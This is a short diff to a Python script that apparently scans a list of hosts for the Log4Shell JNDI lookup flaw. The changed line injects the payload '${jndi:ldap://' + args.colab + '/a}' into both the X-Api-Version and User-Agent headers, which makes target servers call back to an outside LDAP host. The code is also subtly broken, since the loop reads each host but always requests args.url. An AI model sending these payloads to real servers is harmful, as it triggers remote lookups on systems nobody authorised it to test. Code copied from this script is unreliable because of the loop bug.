@@ -19,7 +19,7 @@ if __name__ == "__main__":
         hosts = open(args.urlList, 'r')
         for host in hosts:
             print("Testing: " + host + " can take a bit of time")
-            header = {"X-Api-Version": "${jndi:ldap://" + args.colab + "/a}"}
+            header = {"X-Api-Version": "${jndi:ldap://" + args.colab + "/a}", "User-Agent":"${jndi:ldap://" + args.colab + "/a}"}
 
             try:
                 r = requests.get(args.url, headers=header)
